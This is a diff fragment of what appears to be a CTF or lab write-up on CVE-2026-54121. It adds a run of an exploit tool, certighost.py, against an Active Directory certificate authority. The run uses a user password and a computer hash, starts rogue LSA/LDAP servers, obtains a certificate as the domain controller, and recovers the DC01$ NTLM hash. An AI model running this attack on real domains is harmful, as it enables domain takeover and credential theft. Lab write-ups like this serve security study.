@@ -995,5 +995,24 @@ cd CVE-2026-54121
 So ive cloned the repo
 
 ```python
+sudo python3 certighost.py -d casper.hsm -u xjr -p 'fFvq52PzJpO98X8!' --dc-ip 10.0.31.82 --computer-name 'nix01$' --computer-hash '0cf15e4eee91372abddec89ec40e636e'
+[*] Connecting to LDAPS
+[*] Detecting infrastructure
+    DC: 10.0.31.82 | CA: casper-DC01-CA (10.0.31.82)
+    Target: DC01$ | SID: S-1-5-21-247086266-1178499391-1139383971-1000
+[*] Using existing computer: nix01$
+[*] Starting rogue servers (LSA:445 + LDAP:389)
+[*] Requesting certificate (template=Machine, cdc=10.200.77.133)
+    Saved: dc01.pfx
+[*] PKINIT as DC01$
+[*] Got hash for DC01$:
+    DC01$:aad3b435b51404eeaad3b435b51404ee:55a83395647a19e6a1775834018e2708
+    ccache: dc01.ccache
+[*] GGWP
+```
+
+Now i have the NTLM hash of the `DC01$` machine account
+
+```python
 
 ```
